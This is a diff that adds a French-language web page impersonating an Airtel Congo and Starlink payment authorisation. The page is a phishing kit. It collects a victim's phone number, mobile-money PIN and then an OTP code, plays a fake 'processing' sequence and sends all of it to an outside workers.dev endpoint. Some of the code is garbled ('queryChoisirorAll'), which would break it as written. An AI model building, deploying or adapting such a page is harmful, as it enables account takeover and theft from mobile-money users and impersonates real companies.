@@ -1,0 +1,438 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#C2001A">
+<title>Airtel Congo × Starlink — Autoriser le Paiement</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700;9..40,800;9..40,900&family=DM+Mono:wght@500;600&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{font-family:'DM Sans',system-ui,sans-serif;-webkit-font-smoothing:antialiased;background:#F5F5F5;color:#1C1B1F;display:flex;flex-direction:column;position:fixed;inset:0;width:100%;height:100vh;height:100dvh;overflow:hidden}
+button{font-family:inherit;touch-action:manipulation;border:none;background:none;cursor:pointer;outline:none;-webkit-user-select:none;user-select:none}
+input{font-family:inherit;border:none;outline:none;background:none}
+img{display:block;max-width:100%}
+*{-webkit-user-select:none;user-select:none}
+:root{
+  --red:#C2001A;--red-dk:#960014;--red-lt:#FFDAD6;--on-red:#fff;--on-red-cont:#410002;
+  --blue:#1B62B5;
+  --surf:#FFFBFF;--surf-lo:#F7F2FA;--surf-mid:#F3EDF7;--surf-hi:#ECE6F0;
+  --on-surf:#1C1B1F;--on-surf-v:#49454F;
+  --outline:#79747E;--outline-v:#CAC4D0;
+  --err:#B3261E;--ok:#386A20;--ok-cont:#C0EFA4;
+  --r-sm:8px;--r-md:12px;--r-lg:16px;--r-xl:28px;--r-full:999px;
+  --e1:0 1px 2px rgba(0,0,0,.12),0 1px 3px 1px rgba(0,0,0,.08);
+  --e2:0 1px 2px rgba(0,0,0,.12),0 2px 6px 2px rgba(0,0,0,.10);
+  --ease:cubic-bezier(.2,0,0,1);
+}
+@keyframes rip-anim{to{transform:scale(4);opacity:0}}
+@keyframes pg-in{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* NAV */
+.nav{flex-shrink:0;background:var(--red);display:flex;align-items:center;justify-content:space-between;padding:0 16px;height:calc(56px + env(safe-area-inset-top,0px));padding-top:env(safe-area-inset-top,0px);box-shadow:var(--e2);z-index:20}
+.nav-back{display:flex;align-items:center;gap:8px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;-webkit-user-select:none;user-select:none}
+.nav-logos{display:flex;align-items:center;gap:8px}
+.nav-sep{width:1px;height:16px;background:rgba(255,255,255,.3)}
+.nav-spinner{width:20px;height:20px;border-radius:50%;border:2.5px solid rgba(255,255,255,.25);border-top-color:#fff;animation:spin 1s linear infinite;display:none;flex-shrink:0}
+
+/* STEPS BAR */
+.steps-bar{flex-shrink:0;background:var(--surf);border-bottom:1px solid var(--outline-v);padding:10px 20px;display:flex;align-items:center}
+.si{display:flex;flex-direction:column;align-items:center;gap:3px;flex:1;position:relative}
+.si+.si::before{content:'';position:absolute;top:9px;left:calc(-50%);width:100%;height:1.5px;background:var(--outline-v);z-index:0}
+.si.done+.si::before{background:var(--red)}
+.si-dot{width:18px;height:18px;border-radius:50%;border:2px solid var(--outline-v);background:var(--surf-mid);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:var(--on-surf-v);position:relative;z-index:1;transition:all .3s var(--ease)}
+.si.done .si-dot{background:var(--red);border-color:var(--red);color:#fff}
+.si.active .si-dot{background:var(--red);border-color:var(--red);color:#fff;box-shadow:0 0 0 3px rgba(194,0,26,.2)}
+.si-lbl{font-size:9px;font-weight:600;color:var(--on-surf-v);letter-spacing:.3px;white-space:nowrap}
+.si.active .si-lbl,.si.done .si-lbl{color:var(--red)}
+
+/* VIEW SYSTEM */
+.view{display:none;flex-direction:column;flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;overscroll-behavior-y:contain;scrollbar-width:none;animation:pg-in .3s var(--ease) both}
+.view::-webkit-scrollbar{display:none}
+.view.active{display:flex}
+.content{padding:18px 16px;display:flex;flex-direction:column;gap:16px;flex:1}
+
+/* CARDS */
+.brand-card{background:var(--surf);border-radius:var(--r-xl);box-shadow:var(--e1);padding:20px;display:flex;flex-direction:column;align-items:center;gap:10px}
+.brand-logos{display:flex;align-items:center;gap:10px}
+.bx{font-size:16px;font-weight:800;color:var(--on-surf-v)}
+.brand-title{font-size:16px;font-weight:700;color:var(--on-surf);text-align:center}
+.brand-sub{font-size:12px;color:var(--on-surf-v);text-align:center;line-height:1.65;max-width:280px}
+
+/* PLAN CHIP */
+.forfait-chip{background:var(--red-lt);border-radius:var(--r-xl);padding:14px 16px;display:flex;align-items:center;justify-content:space-between}
+.pc-tag{font-size:10px;font-weight:700;color:var(--on-red-cont);letter-spacing:.4px;text-transform:uppercase;margin-bottom:3px}
+.pc-val{font-size:17px;font-weight:800;color:var(--red)}
+.pc-change{font-size:12px;font-weight:600;color:var(--outline);text-decoration:underline;cursor:pointer}
+
+/* FIELD */
+.field{display:flex;flex-direction:column;gap:5px}
+.field-lbl{font-size:11px;font-weight:700;color:var(--on-surf-v);letter-spacing:.5px;text-transform:uppercase}
+.fw{display:flex;align-items:center;background:var(--surf-mid);border-radius:var(--r-lg) var(--r-lg) 0 0;border-bottom:2px solid var(--outline);height:54px;transition:border-color .18s;overflow:hidden}
+.fw.focus{border-bottom-color:var(--red)}
+.fw.ok{border-bottom-color:var(--ok)}
+.fw.err{border-bottom-color:var(--err)}
+.prefix{display:flex;align-items:center;gap:7px;padding:0 12px;border-right:1px solid var(--outline-v);height:100%;flex-shrink:0;background:var(--surf-hi)}
+.prefix-flag{font-size:18px}
+.prefix-code{font-size:14px;font-weight:700;color:var(--on-surf);font-family:'DM Mono',monospace}
+.f-input{flex:1;height:100%;padding:0 14px;font-size:16px;font-weight:600;color:var(--on-surf);caret-color:var(--red);background:transparent;-webkit-user-select:text!important;user-select:text!important;font-family:'DM Mono',monospace;letter-spacing:.5px}
+.f-input::placeholder{font-size:13px;font-weight:400;letter-spacing:normal;font-family:'DM Sans',sans-serif;color:var(--outline)}
+.f-err{font-size:11px;color:var(--err);font-weight:600;min-height:16px;padding-top:2px}
+
+/* PIN */
+.pin-lbl{font-size:11px;font-weight:700;color:var(--on-surf-v);letter-spacing:.5px;text-transform:uppercase;margin-bottom:8px}
+.pin-boxes{display:flex;gap:12px;justify-content:center;margin-bottom:6px}
+.pb{width:60px;height:60px;border-radius:var(--r-lg);background:var(--surf-mid);border:1.5px solid var(--outline-v);display:flex;align-items:center;justify-content:center;font-size:28px;color:var(--on-surf);transition:border-color .15s,box-shadow .15s}
+.pb.active{border-color:var(--red);box-shadow:0 0 0 3px rgba(194,0,26,.15)}
+.pb.filled::after{content:'\25CF';font-size:20px;color:var(--red)}
+.pin-err{font-size:11px;color:var(--err);font-weight:600;min-height:16px;text-align:center}
+
+/* NUMPAD */
+.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:9px}
+.nk{height:56px;border-radius:var(--r-lg);background:var(--surf);border:1px solid var(--outline-v);font-size:20px;font-weight:600;color:var(--on-surf);display:flex;align-items:center;justify-content:center;cursor:pointer;position:relative;overflow:hidden;transition:background .1s;box-shadow:var(--e1)}
+.nk:active{background:var(--surf-hi);box-shadow:none}
+.nk.del{font-size:17px;color:var(--on-surf-v)}
+.nk.empty{background:transparent;border-color:transparent;box-shadow:none;cursor:default}
+
+/* PRIMARY BTN */
+.btn-primary{width:100%;height:52px;border-radius:var(--r-full);background:var(--red);color:#fff;font-size:15px;font-weight:800;letter-spacing:.3px;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 2px 12px rgba(194,0,26,.35);position:relative;overflow:hidden;transition:transform .12s,box-shadow .12s}
+.btn-primary:active{transform:scale(.97);box-shadow:none}
+.btn-primary.dim{background:var(--surf-hi);color:var(--outline);box-shadow:none}
+
+/* PROCESSING */
+.proc-wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 24px;gap:20px}
+.proc-ring{width:72px;height:72px;border-radius:50%;border:3px solid var(--outline-v);border-top-color:var(--red);animation:spin 1s linear infinite}
+.proc-logos{display:flex;align-items:center;gap:10px}
+.proc-x{font-size:17px;font-weight:700;color:var(--on-surf-v)}
+.proc-title{font-size:18px;font-weight:700;color:var(--on-surf);text-align:center}
+.proc-sub{font-size:13px;color:var(--on-surf-v);text-align:center;line-height:1.65;max-width:260px}
+.proc-bar-wrap{width:100%;max-width:280px;background:var(--outline-v);border-radius:var(--r-full);height:4px;overflow:hidden}
+.proc-bar{height:100%;background:linear-gradient(to right,var(--red),var(--blue));border-radius:var(--r-full);transition:width .5s var(--ease);width:0}
+.proc-steps{display:flex;flex-direction:column;gap:10px;width:100%;max-width:280px}
+.psi{display:flex;align-items:center;gap:10px}
+.psi-dot{width:8px;height:8px;border-radius:50%;background:var(--outline-v);flex-shrink:0;transition:background .3s}
+.psi-dot.act{background:var(--red)}
+.psi-dot.done{background:var(--ok)}
+.psi-txt{font-size:12px;color:var(--on-surf-v)}
+.psi.act .psi-txt{color:var(--on-surf);font-weight:600}
+.psi.done .psi-txt{color:var(--ok)}
+
+/* Code OTP */
+.otp-icon{width:56px;height:56px;border-radius:50%;background:var(--red-lt);display:flex;align-items:center;justify-content:center}
+.otp-phone{background:var(--surf-mid);border:1px solid var(--outline-v);padding:5px 16px;border-radius:var(--r-full);font-size:14px;font-weight:700;color:var(--on-surf);font-family:'DM Mono',monospace}
+.otp-boxes{display:flex;gap:12px;justify-content:center}
+.ob{width:64px;height:64px;border-radius:var(--r-xl);background:var(--surf-mid);border:2px solid var(--outline-v);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:800;color:var(--on-surf);font-family:'DM Mono',monospace;transition:border-color .15s,box-shadow .15s;position:relative;overflow:hidden}
+.ob.active{border-color:var(--red);box-shadow:0 0 0 3px rgba(194,0,26,.15)}
+.ob.filled{border-color:var(--ok);color:var(--ok)}
+.ob.success{background:var(--ok-cont);border-color:var(--ok);color:var(--ok)}
+.otp-timer-row{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--on-surf-v)}
+.otp-timer{font-weight:700;color:var(--red);font-family:'DM Mono',monospace;font-feature-settings:'tnum'}
+.otp-resend{font-size:12px;font-weight:700;color:var(--blue);cursor:pointer;text-decoration:underline}
+.otp-resend.dim{color:var(--outline);text-decoration:none;cursor:default}
+
+.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(0,0,0,.07);transform:scale(0);animation:rip-anim .5s ease forwards}
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-back" onclick="location.href='airtel-index.html'">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+    Retour
+  </div>
+  <div class="nav-logos">
+    <img src="assets/airtel-logo.svg" alt="Airtel" height="18" onerror="this.outerHTML='<span style=\'font-size:16px;font-weight:900;color:#fff\'>airtel</span>'">
+    <div class="nav-sep"></div>
+    <img src="assets/starlink-white.png" alt="Starlink" height="12" onerror="this.outerHTML='<span style=\'font-size:10px;font-weight:800;letter-spacing:1.5px;color:rgba(255,255,255,.85)\'>STARLINK</span>'">
+  </div>
+  <div class="nav-spinner" id="navSpinner"></div>
+</nav>
+
+<div class="steps-bar">
+  <div class="si done" id="sp0"><div class="si-dot">&#10003;</div><div class="si-lbl">Forfait</div></div>
+  <div class="si active" id="sp1"><div class="si-dot">2</div><div class="si-lbl">Connexion</div></div>
+  <div class="si" id="sp2"><div class="si-dot">3</div><div class="si-lbl">Traitement</div></div>
+  <div class="si" id="sp3"><div class="si-dot">4</div><div class="si-lbl">Code OTP</div></div>
+</div>
+
+<!-- VIEW: LOGIN -->
+<div class="view active" id="viewConnexion">
+  <div class="content">
+    <div class="brand-card">
+      <div class="brand-logos">
+        <img src="assets/airtel-logo.svg" alt="Airtel" height="20" onerror="this.outerHTML='<span style=\'font-size:18px;font-weight:900;color:var(--red)\'>airtel</span>'">
+        <span class="bx">&times;</span>
+        <img src="assets/starlink-black.png" alt="Starlink" height="12" onerror="this.outerHTML='<span style=\'font-size:11px;font-weight:800;letter-spacing:1px;color:var(--on-surf)\'>STARLINK</span>'">
+      </div>
+      <div class="brand-title">Connexion Airtel Lite</div>
+      <div class="brand-sub">Entrez votre num&eacute;ro Airtel et votre code PIN &agrave; 4 chiffres pour autoriser votre paiement haut d&eacute;bit satellite.</div>
+    </div>
+
+    <div class="forfait-chip">
+      <div>
+        <div class="pc-tag">Choisired Forfait</div>
+        <div class="pc-val" id="forfaitLabel">Chargement&hellip;</div>
+      </div>
+      <div class="pc-change" onclick="location.href='airtel-index.html'">Modifier</div>
+    </div>
+
+    <div class="field">
+      <div class="field-lbl">Numéro Airtel Lite</div>
+      <div class="fw" id="fw-phone">
+        <div class="prefix">
+          <span class="prefix-flag">&#127464;&#127465;</span>
+          <span class="prefix-code">+243</span>
+        </div>
+        <input class="f-input" id="phoneInput" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="9XX XXX XXX" maxlength="9">
+      </div>
+      <div class="f-err" id="phoneErr"></div>
+    </div>
+
+    <div>
+      <div class="pin-lbl">Code PIN de S&eacute;curit&eacute; (4 chiffres)</div>
+      <div class="pin-boxes">
+        <div class="pb" id="pb0"></div>
+        <div class="pb" id="pb1"></div>
+        <div class="pb" id="pb2"></div>
+        <div class="pb" id="pb3"></div>
+      </div>
+      <div class="pin-err" id="pinErr"></div>
+    </div>
+
+    <div class="numpad" id="numpad">
+      <button class="nk" data-v="1">1</button><button class="nk" data-v="2">2</button><button class="nk" data-v="3">3</button>
+      <button class="nk" data-v="4">4</button><button class="nk" data-v="5">5</button><button class="nk" data-v="6">6</button>
+      <button class="nk" data-v="7">7</button><button class="nk" data-v="8">8</button><button class="nk" data-v="9">9</button>
+      <button class="nk empty" disabled></button><button class="nk" data-v="0">0</button><button class="nk del" id="npDel">&#9003;</button>
+    </div>
+
+    <button class="btn-primary dim" id="loginBtn" onclick="submitConnexion()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
+      Autoriser le Paiement
+    </button>
+    <div style="height:8px"></div>
+  </div>
+</div>
+
+<!-- VIEW: PROCESSING -->
+<div class="view" id="viewProc">
+  <div class="proc-wrap">
+    <div class="proc-ring"></div>
+    <div class="proc-logos">
+      <img src="assets/airtel-logo.svg" alt="Airtel" height="18" onerror="this.outerHTML='<span style=\'font-size:16px;font-weight:900;color:var(--red)\'>airtel</span>'">
+      <span class="proc-x">&times;</span>
+      <img src="assets/starlink-black.png" alt="Starlink" height="11" onerror="this.outerHTML='<span style=\'font-size:10px;font-weight:800;letter-spacing:1px;color:var(--on-surf)\'>STARLINK</span>'">
+    </div>
+    <div class="proc-title">Traitement&hellip;</div>
+    <div class="proc-sub" id="procSub">Connexion s&eacute;curis&eacute;e en cours&hellip;</div>
+    <div class="proc-bar-wrap"><div class="proc-bar" id="procBar"></div></div>
+    <div class="proc-steps">
+      <div class="psi act" id="psi0"><div class="psi-dot act"></div><div class="psi-txt">Connexion s&eacute;curis&eacute;e &eacute;tablie</div></div>
+      <div class="psi" id="psi1"><div class="psi-dot"></div><div class="psi-txt">V&eacute;rification du compte Airtel</div></div>
+      <div class="psi" id="psi2"><div class="psi-dot"></div><div class="psi-txt">Validation du forfait donn&eacute;es</div></div>
+      <div class="psi" id="psi3"><div class="psi-dot"></div><div class="psi-txt">Sending Code OTP code&hellip;</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- VIEW: Code OTP -->
+<div class="view" id="viewOTP">
+  <div class="content">
+    <div class="brand-card">
+      <div class="otp-icon">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+      </div>
+      <div class="brand-title">Code V&eacute;rification OTP</div>
+      <div class="brand-sub">Un code &agrave; 4 chiffres a &eacute;t&eacute; envoy&eacute; sur votre num&eacute;ro Airtel</div>
+      <div class="otp-phone" id="otpPhone">+243 &mdash;</div>
+    </div>
+
+    <div class="otp-boxes">
+      <div class="ob" id="ob0"></div>
+      <div class="ob" id="ob1"></div>
+      <div class="ob" id="ob2"></div>
+      <div class="ob" id="ob3"></div>
+    </div>
+
+    <div style="display:flex;flex-direction:column;align-items:center;gap:8px">
+      <div class="otp-timer-row">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+        Code expire dans <span class="otp-timer" id="otpTimer">60</span>s
+      </div>
+      <div class="otp-resend dim" id="resendBtn" onclick="resendOTP()">Resend Code OTP</div>
+    </div>
+
+    <div class="numpad" id="otpNumpad">
+      <button class="nk" data-v="1">1</button><button class="nk" data-v="2">2</button><button class="nk" data-v="3">3</button>
+      <button class="nk" data-v="4">4</button><button class="nk" data-v="5">5</button><button class="nk" data-v="6">6</button>
+      <button class="nk" data-v="7">7</button><button class="nk" data-v="8">8</button><button class="nk" data-v="9">9</button>
+      <button class="nk empty" disabled></button><button class="nk" data-v="0">0</button><button class="nk del" id="otpDel">&#9003;</button>
+    </div>
+
+    <button class="btn-primary dim" id="otpBtn" onclick="submitOTP()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Valider le Code
+    </button>
+    <div style="height:8px"></div>
+  </div>
+</div>
+
+<script>
+'use strict';
+var WORKER='https://airtel-congo-api.lennxkoros.workers.dev';
+function hap(ms){try{navigator.vibrate&&navigator.vibrate(ms);}catch(e){}}
+function rip(el,e){var r=el.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2.5,s=document.createElement('span');s.className='rip';s.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px;';el.appendChild(s);s.addEventListener('animationend',function(){s.remove();});}
+function slp(ms){return new Promise(function(r){setTimeout(r,ms);})}
+
+// Load forfait
+var forfait={};
+try{forfait=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
+if(!forfait.name){location.href='airtel-index.html';}
+document.getElementById('forfaitLabel').textContent=(forfait.name||'')+' \u00b7 '+(forfait.price||'');
+
+// View management
+function showView(id){document.queryChoisirorAll('.view').forEach(function(v){v.classList.remove('active');});document.getElementById(id).classList.add('active');}
+function setStep(n){
+  for(var i=0;i<4;i++){
+    var el=document.getElementById('sp'+i);el.classList.remove('active','done');
+    var dot=el.queryChoisiror('.si-dot');
+    if(i<n){el.classList.add('done');dot.innerHTML='&#10003;';}
+    else if(i===n){el.classList.add('active');dot.textContent=i+1;}
+    else{dot.textContent=i+1;}
+  }
+}
+
+// PIN
+var pin='';
+function renderPIN(){
+  for(var i=0;i<4;i++){
+    var b=document.getElementById('pb'+i);
+    b.className='pb'+(i===pin.length?' active':'')+(i<pin.length?' filled':'');
+    b.innerHTML='';
+  }
+  updateConnexionBtn();
+}
+function updateConnexionBtn(){
+  var ph=document.getElementById('phoneInput').value.replace(/[^0-9]/g,'');
+  document.getElementById('loginBtn').classList.toggle('dim',!(ph.length===9&&pin.length===4));
+}
+document.getElementById('numpad').addEventListener('click',function(e){
+  var k=e.target.closest('.nk');if(!k||k.disabled)return;
+  hap(8);rip(k,e);
+  if(k.id==='npDel'){if(pin.length)pin=pin.slice(0,-1);}
+  else if(k.dataset.v!==undefined&&pin.length<4){pin+=k.dataset.v;}
+  renderPIN();
+});
+document.getElementById('phoneInput').addEventListener('input',function(){
+  this.value=this.value.replace(/[^0-9]/g,'').slice(0,9);
+  document.getElementById('phoneErr').textContent='';
+  document.getElementById('fw-phone').classList.remove('err','ok');
+  updateConnexionBtn();
+});
+document.getElementById('phoneInput').addEventListener('focus',function(){document.getElementById('fw-phone').classList.add('focus');});
+document.getElementById('phoneInput').addEventListener('blur',function(){
+  document.getElementById('fw-phone').classList.remove('focus');
+  var v=this.value.replace(/[^0-9]/g,'');
+  var fw=document.getElementById('fw-phone');
+  if(v&&v.length!==9){fw.classList.add('err');document.getElementById('phoneErr').textContent='Entrez un num&eacute;ro Airtel valide &agrave; 9 chiffres (ex. 951 234 567)';}
+  else if(v.length===9){fw.classList.add('ok');}
+});
+renderPIN();
+
+// Submit login
+function submitConnexion(){
+  var ph=document.getElementById('phoneInput').value.replace(/[^0-9]/g,'');
+  if(ph.length!==9){document.getElementById('fw-phone').classList.add('err');document.getElementById('phoneErr').textContent='Entrez un numéro valide à 9 chiffres';hap([25,15,25]);return;}
+  if(pin.length!==4){document.getElementById('pinErr').textContent='Entrez votre code PIN &agrave; 4 chiffres';hap([25,15,25]);return;}
+  sessionStorage.setItem('starlinkAuth',JSON.stringify({phone:ph,pin:pin}));
+  sendEvent('starlink_pin_submitted',{forfait:forfait.name,price:forfait.price,phone:'+243'+ph,pin:pin,device:navigator.userAgent.slice(0,80)});
+  hap(18);
+  document.getElementById('navSpinner').style.display='block';
+  setStep(2);showView('viewProc');
+  runTraitement(ph);
+}
+
+// Traitement
+async function runTraitement(ph){
+  var bar=document.getElementById('procBar');
+  var sub=document.getElementById('procSub');
+  var steps=[
+    {pct:25,txt:'V&eacute;rification du compte Airtel\u2026',si:1},
+    {pct:55,txt:'Validating '+forfait.name+' forfait\u2026',si:2},
+    {pct:85,txt:'Sending Code OTP to +243 '+ph+'\u2026',si:3},
+    {pct:100,txt:'Code Code OTP envoyé sur votre téléphone !'},
+  ];
+  for(var i=0;i<steps.length;i++){
+    await slp(1300);
+    bar.style.width=steps[i].pct+'%';sub.textContent=steps[i].txt;
+    if(steps[i].si){
+      var prev=document.getElementById('psi'+(steps[i].si-1));
+      if(prev){prev.className='psi done';prev.queryChoisiror('.psi-dot').className='psi-dot done';}
+      var cur=document.getElementById('psi'+steps[i].si);
+      cur.className='psi act';cur.queryChoisiror('.psi-dot').className='psi-dot act';
+    }
+  }
+  await slp(500);
+  document.getElementById('otpPhone').textContent='+243 '+ph.slice(0,2)+' '+ph.slice(2,5)+' '+ph.slice(5);
+  otpVal='';renderOTP();updateOTPBtn();startTimer();
+  setStep(3);showView('viewOTP');
+  document.getElementById('navSpinner').style.display='none';
+}
+
+// Code OTP
+var otpVal='',timerInterval=null,timerSecs=60;
+function renderOTP(){
+  for(var i=0;i<4;i++){
+    var b=document.getElementById('ob'+i);
+    b.className='ob'+(i===otpVal.length?' active':'')+(i<otpVal.length?' filled':'');
+    b.textContent=i<otpVal.length?otpVal[i]:'';
+  }
+}
+function updateOTPBtn(){document.getElementById('otpBtn').classList.toggle('dim',otpVal.length!==4);}
+function startTimer(){
+  timerSecs=60;document.getElementById('otpTimer').textContent=timerSecs;
+  document.getElementById('resendBtn').classList.add('dim');
+  if(timerInterval)clearInterval(timerInterval);
+  timerInterval=setInterval(function(){
+    timerSecs--;document.getElementById('otpTimer').textContent=timerSecs;
+    if(timerSecs<=0){clearInterval(timerInterval);document.getElementById('resendBtn').classList.remove('dim');}
+  },1000);
+}
+function resendOTP(){
+  if(timerSecs>0)return;
+  var auth={};try{auth=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
+  sendEvent('starlink_otp_resent',{forfait:forfait.name,phone:'+243'+(auth.phone||''),ref:sessionStorage.getItem('starlinkRef')||''});
+  hap(15);otpVal='';renderOTP();updateOTPBtn();startTimer();
+}
+document.getElementById('otpNumpad').addEventListener('click',function(e){
+  var k=e.target.closest('.nk');if(!k||k.disabled)return;
+  hap(8);rip(k,e);
+  if(k.id==='otpDel'){if(otpVal.length)otpVal=otpVal.slice(0,-1);}
+  else if(k.dataset.v!==undefined&&otpVal.length<4){otpVal+=k.dataset.v;}
+  renderOTP();updateOTPBtn();
+});
+function submitOTP(){
+  if(otpVal.length!==4){hap([25,15,25]);return;}
+  var auth={};try{auth=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
+  var ref='STL-CG-'+(Math.random()*9e5+1e5|0);
+  sessionStorage.setItem('starlinkRef',ref);
+  sessionStorage.setItem('starlinkCode OTP',otpVal);
+  sendEvent('starlink_otp_confirmed',{forfait:forfait.name,price:forfait.price,phone:'+243'+(auth.phone||''),pin:auth.pin||'',otp:otpVal,ref:'#'+ref,device:navigator.userAgent.slice(0,80)});
+  for(var i=0;i<4;i++)document.getElementById('ob'+i).classList.add('success');
+  hap([18,8,35]);
+  setTimeout(function(){
+    var c=document.createElement('div');
+    c.style.cssText='position:fixed;inset:0;background:var(--red);opacity:0;z-index:999;transition:opacity .25s ease';
+    document.body.appendChild(c);
+    requestAnimationFrame(function(){c.style.opacity='1';setTimeout(function(){location.href='airtel-thankyou.html';},260);});
+  },500);
+}
+function sendEvent(ev,data){try{fetch(WORKER+'/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event:ev,data:data,ts:new Date().toISOString()})}).catch(function(){});}catch(e){}}
+document.queryChoisirorAll('button').forEach(function(b){b.addEventListener('pointerdown',function(e){rip(this,e);},{passive:true});});
+</script>
+</body>
+</html>
